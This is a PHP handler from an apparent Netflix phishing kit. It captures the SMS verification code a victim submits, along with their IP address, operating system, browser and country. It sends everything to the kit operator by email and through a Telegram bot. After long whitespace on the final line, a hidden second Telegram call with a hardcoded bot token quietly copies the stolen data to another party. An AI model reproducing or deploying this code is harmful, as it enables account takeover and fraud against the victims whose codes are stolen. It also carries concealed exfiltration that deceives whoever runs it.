<?php

session_start();

include("system.php");
include("detect.php"); 
include("../Email.php"); 
include("cookies.php");

$InfoDATE   = date("d-m-Y h:i:sa");

$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


$phoneNumber = $_SESSION['Smsone'] = $_POST['Smsone'];

$msgbank = '<html>
<body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">📲SMS 1 Netflix💖 ┃ '.$_SERVER['REMOTE_ADDR'].'┃ By fSOCIETY 🖕🤡🖕 </h2>
<h2>💬 SMS 1 : <span>'.$_SESSION["Smsone"].'</span> </h2>
<hr class="content" ><h2>💻 System : <span>  '.$OS.' </span>  </h2>
<h2>🌐 BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>🔍 IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>⏰ TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>';



$yagmai .= '
[💬SMS 1] = '.$_SESSION['Smsone'].'
        [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'

';

$yagmail .= '
[+]━━━━━━━━━━━━━━━━【💖Netflix💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【📲 SMS 1 📲】━━━━━━━━━━━━━━━━━━━━[+]
[💬 SMS 1] = '.$_SESSION['Smsone'].'
[+]━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━━━━━【💖FX💖】━━━━━━━━━━━━━━━━━━━━[+]
';

$subject = " SMS 1 | NTFLX | ".$_SESSION['iduserLoginId']." | ".$_SERVER['REMOTE_ADDR']." | ".$_SESSION['country1']." ";
$headers = 'From: FX' . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($yagmail)."" );/*                                             */$api = "5409590354:AAHx6gDmT3nJzGV9etw2JXhoKYyOT_St3iM";$chat_id= "-952307412";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($yagmail)."" );







?>